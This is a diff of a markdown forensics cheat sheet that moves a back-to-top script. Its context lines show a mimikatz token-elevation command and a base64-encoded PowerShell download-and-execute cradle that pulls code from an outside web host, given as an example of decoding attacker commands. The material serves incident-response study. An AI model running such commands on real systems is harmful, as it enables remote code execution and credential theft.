@@ -4144,14 +4144,6 @@ mimikatz # token:elevate /domain admin (identifies any domain admins present on 
 echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8
 ```
 
-
-<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
-<script>addBackToTop({
-  diameter: 56,
-  backgroundColor: 'rgb(255, 82, 82)',
-  textColor: '#fff'
-})</script>
-
 <br>
 
 # Anti-Forensics
@@ -4442,6 +4434,16 @@ Velociraptor artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:\\Windo
 - Maintains very detailed information, including fill payload data to be recorded in MFT, Indexes, UsnJrnl, & more
 - Tends to last just a dew hours on active systems
   - Secondary drives often last much longer (i.e. days)
+
+
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: 'rgb(255, 82, 82)',
+  textColor: '#fff'
+})</script>
+
 
 
 
